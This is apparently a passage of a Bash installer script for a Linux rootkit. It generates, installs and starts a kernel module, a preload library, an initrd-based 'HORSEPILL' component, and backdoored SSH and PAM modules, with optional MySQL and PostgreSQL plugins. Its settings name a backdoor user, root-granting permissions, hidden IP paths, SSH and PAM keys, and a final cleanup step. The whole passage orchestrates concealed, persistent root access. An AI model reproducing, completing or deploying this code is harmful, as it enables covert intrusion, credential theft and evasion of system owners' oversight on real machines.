#~ declare -a array ZYP_PG_DEPS=("postgresql-server-devel")

declare -a array TOOLS=("loader" "elfchngr" "passgen" "skipcpio")

ADDED=("access" "acl" "acls" "active" "add" "addr" "advance" "ahash" "alg" "alias" "alignment" "all" "alloc" "allocate" "and" "anon" "any" "apply" "arbitrary" "arch" "arg" "array" "async" "atime" "atomic" "attrs" "autoremove" "backing" "bad" "barrier" "base" "batch" "bdev" "bdget" "bdi" "begin" "binary" "bind" "binfmt" "binprm" "bio" "bioset" "bit" "bitmap" "bits" "blk" "blkdev" "block" "blockdev" "blocksize" "bool" "boot" "boundary" "bprm" "bridge" "buf" "buffer" "buggy" "busy" "but" "by" "bytes" "cache" "cached" "caches" "call" "callback" "cancel" "capability" "capable" "card" "carrier" "change" "channel" "channels" "charp" "check" "checks" "checksum" "child" "claim" "class" "cleanup" "clear" "clone" "close" "closed" "cnt" "color" "compat" "complete" "completion" "congested" "consume" "context" "control" "copy" "core" "count" "counter" "cpu" "cpumask" "cpus" "crc" "create" "cryptd" "crypto" "ctl" "current" "d" "data" "dcache" "debugfs" "dec" "default" "del" "delete" "deregister" "desc" "destroy" "dev" "device" "devices" "dget" "digest" "dir" "diralias" "direct" "dirty" "disable" "discard" "disk" "dissector" "dma" "do" "domain" "done" "down" "driver" "drop" "dump" "ecards" "empty" "enable" "end" "enhanced" "entropy" "entry" "env" "erase" "erms" "err" "error" "errors" "eth" "ether" "etherdev" "ethtool" "event" "evtchn" "ex" "exec" "exists" "fast" "fasync" "fatal" "fault" "fd" "features" "file" "filemap" "filesystem" "fill" "fillattr" "filp" "final" "find" "finish" "first" "flags" "flow" "flush" "fops" "for" "foreach" "foreign" "forget" "fortify" "forward" "fpu" "frag" "free" "freezable" "freezing" "from" "frontend" "fs" "fsync" "full" "function" "gather" "gen" "gendisk" "generic" "get" "gfn" "gnttab" "grab" "grant" "gro" "group" "handler" "has" "hash" "hcall" "helper" "hw" "hypercall" "id" "ids" "in" "inc" "info" "initialize" "ino" "inode" "input" "insert" "install" "instance" "instantiate" "int" "interdomain" "interface" "interp" "interrupt" "interruptible" "intr" "invalidate" "io" "ioctl" "iomap" "iosf" "iov" "irq" "irqhandler" "is" "isa" "issue" "iter" "jiffies" "kernel" "key" "keys" "kfree" "kgid" "kick" "kill" "kmalloc" "kmem" "kobj" "kobject" "kstrtoul" "kthread" "ktime" "kuid" "kvmalloc" "latent" "le" "legacy" "len" "limit" "line" "link" "list" "litter" "llseek" "lock" "locked" "lockref" "locks" "logical" "lookup" "lru" "lseek" "mac" "machine" "major" "make" "map" "mapped" "mapping" "mask" "match" "max" "mbi" "me" "memdup" "memory" "metadata" "migrate" "minor" "misc" "mm" "mmap" "mmu" "mod" "mode" "module" "mount" "mq" "mqs" "mtu" "munged" "mutex" "name" "napi" "net" "netdev" "netif" "netlink" "new" "next" "nic" "nla" "nlink" "no" "node" "nodev" "nonseekable" "noop" "nosteal" "nosync" "notifier" "notify" "now" "npages" "nr" "ns" "num" "numa" "obtain" "octal" "off" "offset" "on" "once" "one" "online" "op" "open" "operations" "ops" "or" "order" "orig" "oss" "p2m" "page" "pagebuf" "pagecache" "pages" "panic" "parallel" "param" "parent" "parse" "path" "pathfmt" "peers" "pending" "percpu" "perf" "permission" "pfn" "pgprot" "phys" "physical" "pid" "pin" "pipe" "platform" "plug" "pm" "pmu" "point" "pool" "posix" "power" "powercap" "preemptible" "preferred" "prep" "prepare" "print" "printf" "private" "privcmd" "privs" "proc" "process" "public" "put" "puts" "pv" "qos" "query" "queue" "queued" "queues" "random" "range" "ratelimit" "ratio" "rb" "rcu" "rcv" "rdmsrl" "read" "readable" "real" "rebind" "receive" "recursive" "redirty" "ref" "refcount" "refcounted" "reference" "references" "refs" "register" "release" "remap" "remote" "remove" "rep" "replace" "request" "requeue" "resource" "revalidate" "ring" "rng" "ro" "rq" "rtnl" "rx" "safe" "sb" "scanf" "sched" "schedule" "search" "sectors" "seg" "segment" "segments" "sem" "seq" "set" "setattr" "setkey" "setpos" "setup" "sg" "shash" "should" "show" "shrink" "simple" "single" "size" "skb" "slow" "sme" "smp" "snd" "sound" "space" "spawns" "special" "spin" "splice" "start" "state" "statfs" "stop" "stopped" "store" "str" "strdup" "string" "strings" "strstate" "strtoul" "subdevice" "submit" "super" "superblock" "switch" "symlink" "sync" "synchronize" "sys" "sysfs" "system" "t10dif" "table" "tag" "task" "tasklet" "test" "this" "threaded" "time" "timeout" "timer" "timespec" "to" "token" "totalram" "touch" "trace" "trans" "transaction" "trim" "truncate" "try" "trylock" "tx" "type" "uevent" "uint" "umask" "unbind" "unescape" "unicast" "unlock" "unmap" "unregister" "unrolled" "unsigned" "unused" "up" "update" "usable" "user" "uts" "validate" "valloc" "var" "vcpu" "vfree" "vfs" "via" "virt" "vm" "vma" "vmalloc" "vmemmap" "vnr" "wait" "wake" "warn" "watch" "wb" "work" "would" "wq" "write" "writeback" "writecombine" "writeout" "writepage" "xattr" "xen" "xenballooned" "xenbus" "zero" "zeroed" "zone")

###
check_big_problems
repo
install_deps
purge_deps
compile_tools
check_little_problems
###
pre_gen
fecho "Generating..."
gen "CLIENT"
gen "LD"
if (( DEPS_FAIL == 1 )); then
	if [[ "${INITR}" =~ "initrd" && -s "${init_folder}"/bin/run-init && ! "${did,,}" =~ 'ubuntu' ]]; then
		gen "HORSEPILL"
	else
		gen "SERVICE"
	fi
else
	gen "LKM"
	gen "LOADER"
fi
gen "SSHD"
gen "PAM"
if (( MYSQL == 1 )); then
	gen "MYSQL"
fi
if (( POSTGRES == 1 )); then
	gen "POSTGRES"
fi
fecho "Generating complete."
fecho "Installing..."
install "LD"
if (( DEPS_FAIL == 1 )); then
	if [[ "${INITR}" =~ "initrd" && -s "${init_folder}"/bin/run-init && ! "${did,,}" =~ 'ubuntu' ]]; then
		install "HORSEPILL"
	else
		install "SERVICE"
		install "CLIENT"
	fi
else
	install "LOADER"
	install "CLIENT"
fi
install "PAM"
install "SSHD"
if (( MYSQL == 1 )); then
	install "MYSQL"
fi
if (( POSTGRES == 1 )); then
	install "POSTGRES"
fi
fecho "Installation complete."
printf '{' > "${tmp_dir}"/json.txt
for i in {"XKEY","UUID","MGID","CLIENT","MODPATH","GIVEROOTPERM","LDP","PURGE","N_P_N","LKM_MOD","BD_UNAME","CLEAN_PW","N_PRELOAD","SOPATH","LDSO_LOGS","HIDE_IP_PATH","SSHD_VER","SSHD_LOGS","SSHD_SECKEY","SSHD_NEWKEY","S_F_P_NS_NAME","PAM_IP","PAM_LOGS","PAM_KEY","MYSQL_NAME","MYSQL_I_DIR","MYSQL_SO","MYSQL_P_DIR","POSTGRES_NAME","POSTGRES_I_DIR","POSTGRES_SO","CLNT","LD","LKM","HP","SRV","SSHD","PAM","MYSQL","POSTGRES","CLIENT_BN","SECTION_NAME"}; do
	if [[ ${!i} ]]; then
		cecho "${i}\t${!i}"
		printf "\"${i,,}\":\"${!i}\"," >> "${tmp_dir}"/json.txt
	fi
done|column -t|sed 's/\[=\]/ [=]/g'
sed -i 's/,$/}/g' "${tmp_dir}"/json.txt
fecho "Starting..."
if (( MYSQL == 1 )); then
	run "MYSQL"
fi
if (( POSTGRES == 1 )); then
	run "POSTGRES"
fi
run "PAM"
run "SSHD"
if (( DEPS_FAIL == 1 )); then
	if [[ "${INITR}" =~ "initrd" && -s "${init_folder}"/bin/run-init && ! "${did,,}" =~ "ubuntu" ]]; then
		run "HORSEPILL"
		run "CLIENT"
	else
		run "SERVICE"
	fi
	run "LD"
else
	run "LKM"
fi
fecho "Started complete."
###
fecho "Cleaning..."
cleanall
fecho "Cleaning complete."
###
